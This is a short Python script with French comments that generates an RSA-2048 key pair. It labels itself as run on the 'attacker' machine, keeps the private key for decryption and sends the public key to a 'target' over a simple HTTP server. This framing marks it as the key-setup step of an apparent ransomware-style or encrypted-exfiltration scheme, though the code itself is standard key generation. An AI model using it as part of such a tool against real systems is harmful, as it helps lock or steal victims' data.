#!/usr/bin/env python3
"""
genkey.py — Génère la paire de clés RSA-2048 (à lancer sur l'ATTAQUANT)
Produit : private.pem (garde le secret) + public.pem (envoie à la target)
"""

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

print("[*] Génération de la paire RSA-2048...")

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)

# Sauvegarde private key
with open("private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    ))

# Sauvegarde public key
with open("public.pem", "wb") as f:
    f.write(private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ))

print("[+] private.pem → garde-le précieusement (déchiffrement)")
print("[+] public.pem  → envoie-le à la target (via HTTP ou autre)")
print()
print("Commande pour servir public.pem à la target :")
print("  python3 -m http.server 8080")
